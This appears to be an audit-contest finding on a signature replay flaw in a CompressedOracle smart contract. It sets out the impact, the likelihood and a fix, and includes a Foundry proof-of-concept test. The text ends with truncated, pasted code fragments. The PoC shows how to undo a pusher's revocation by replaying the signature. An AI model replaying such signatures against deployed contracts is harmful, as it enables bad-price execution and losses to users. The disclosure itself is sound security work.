### Title
Signature Replay in `allowPushers` Defeats `revokePusher` Finality — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`CompressedOracleV1.allowPushers` accepts an EIP-191 signature that commits to `(chainid, address(this), deadline, pusher, creator)` but tracks **no nonce and no used-signature set**. A creator who saved the original signature can replay it any number of times before the deadline expires, silently re-establishing `namespaceRemapping[pusher] = creator` after the pusher called `revokePusher()`.

### Finding Description

`allowPushers` constructs the signed hash as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce field and no mapping that marks a signature as consumed after first use. The only replay barrier is the deadline check:

```solidity
require(block.timestamp <= deadline, DeadlineExceeded());
``` [2](#0-1) 

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

Because the same `(deadline, pusher, creator)` tuple produces the same hash, the creator can immediately call `allowPushers` again with the identical signature and deadline, writing `namespaceRemapping[pusher] = creator` back. The code's own comment acknowledges the deadline is the sole guard against post-revocation replay, but it only blocks replay **after** the deadline expires — not within the window. [4](#0-3) 

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So every push the pusher makes after the creator's replay lands in the **creator's** namespace, not the pusher's own.

### Impact Explanation

Two concrete fund-loss paths exist:

1. **Pusher's own pools receive stale data.** The pusher, believing revocation succeeded, continues pushing data for their own pools. Because `namespaceRemapping[pusher]` has been silently reset to `creator`, every push updates the creator's storage slot, leaving the pusher's own namespace feeds at their last pre-revocation values. Any pool consuming `feedIdOf(pusher, ...)` now reads stale prices, enabling bad-price execution (arbitrage against stale bid/ask, incorrect swap settlement).

2. **Creator's pools receive the pusher's data.** If the pusher is now pushing for a different asset pair (their own), the creator's pool reads that mismatched price, producing inverted or unbounded quotes that directly harm swappers.

Both paths satisfy the contest's **bad-price execution** impact gate.

### Likelihood Explanation

- The creator must have retained the original signature and the deadline must still be valid. Deadlines are typically set days or weeks in the future (the question's example uses `block.timestamp + 1 days`), giving a wide replay window.
- No privileged role is required beyond being the `msg.sender` who originally called `allowPushers` — this is a normal creator action.
- The pusher has no on-chain way to detect the re-delegation without monitoring events, and no way to prevent it short of never signing again.

### Recommendation

Mark each signature as consumed after first use:

```solidity
mapping(bytes32 => bool) private _usedDelegationHashes;

// inside allowPushers, after recovering the signer:
require(!_usedDelegationHashes[hash], SignatureAlreadyUsed());
_usedDelegationHashes[hash] = true;
```

Alternatively, include a per-pusher nonce in the signed payload and increment it on each successful `allowPushers` call, so a revoked pusher can invalidate all prior signatures by incrementing their nonce via a self-call.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayTest is Test {
    CompressedOracleV1 oracle;
    uint256 pusherKey = 0xBEEF;
    address pusher;
    address creator;

    function setUp() public {
        pusher  = vm.addr(pusherKey);
        creator = makeAddr("creator");
        oracle  = new CompressedOracleV1(address(this), 60_000);
    }

    function test_revocationBypassViaReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator
        bytes32 hash = keccak256(abi.encode(
            block.chainid, address(oracle), deadline, pusher, creator
        ));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pusherKey, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // 2. Creator delegates pusher
        address[] memory pushers = new address[](1); pushers[0] = pusher;
        bytes[]   memory sigs    = new bytes[](1);   sigs[0]    = sig;
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature — deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // 5. Revocation silently undone
        assertEq(oracle.namespaceRemapping(pusher), creator);
    }
}

    ///         deadline is likewise required: the signed consent carries no timestamp of

    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {

        }
    }
